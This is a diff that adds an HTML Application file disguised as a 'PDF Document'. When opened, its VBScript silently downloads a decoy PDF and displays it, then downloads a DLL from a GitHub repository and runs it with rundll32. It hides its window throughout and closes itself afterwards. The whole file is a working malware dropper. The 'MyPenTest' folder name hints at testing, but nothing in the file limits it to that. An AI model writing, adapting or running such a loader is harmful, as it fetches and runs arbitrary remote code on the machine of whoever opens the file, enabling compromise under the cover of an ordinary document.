@@ -1,0 +1,65 @@
+<html>
+<head>
+<title>PDF Document</title>
+<hta:application
+    id="pdfViewer"
+    applicationname="PDF Document"
+    border="none"
+    borderstyle="normal"
+    caption="no"
+    icon="%SystemRoot%\System32\shell32.dll,36"
+    maximizebutton="no"
+    minimizebutton="no"
+    showintaskbar="no"
+    windowstate="normal"
+/>
+<script language="VBScript">
+    Sub Window_OnLoad
+        On Error Resume Next
+
+        Set objShell = CreateObject("WScript.Shell")
+        Set objShellApp = CreateObject("Shell.Application")
+
+        ' Expand environment variables safely
+        tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
+        targetDir = tempDir & "\MyPenTest"
+        pdfUrl = "https://raw.githubusercontent.com/bhekinko/test/main/dummy.pdf"
+        pdfLocal = targetDir & "\dummy.pdf"
+        dllUrl = "https://raw.githubusercontent.com/bhekinko/test/main/notepad2.dll"
+        dllPath = tempDir & "\notepad2.dll"
+
+        ' Create target directory
+        objShell.Run "cmd.exe /c mkdir """ & targetDir & """ >nul 2>&1", 0, True
+
+        ' Delay to ensure directory creation
+        WScript.Sleep 2000
+
+        ' Download PDF
+        objShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '" & pdfUrl & "' -OutFile '" & pdfLocal & "'""", 0, True
+
+        ' Open PDF silently
+        objShellApp.ShellExecute pdfLocal, "", "", "open", 0
+
+        ' Download DLL
+        objShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '" & dllUrl & "' -OutFile '" & dllPath & "'""", 0, True
+
+        ' Delay before execution
+        WScript.Sleep 5000
+
+        ' Execute the DLL using rundll32
+        objShell.Run "rundll32.exe """ & dllPath & """,notepad", 0, False
+
+        ' Close the HTA window after delay
+        window.resizeTo 0, 0
+        window.setTimeout "window.close()", 5000
+
+    End Sub
+</script>
+</head>
+<body>
+    <div style="font-family: Arial; text-align: center; margin-top: 20px;">
+        <h3>Opening PDF document, please wait...</h3>
+        <p>This window will close automatically.</p>
+    </div>
+</body>
+</html>
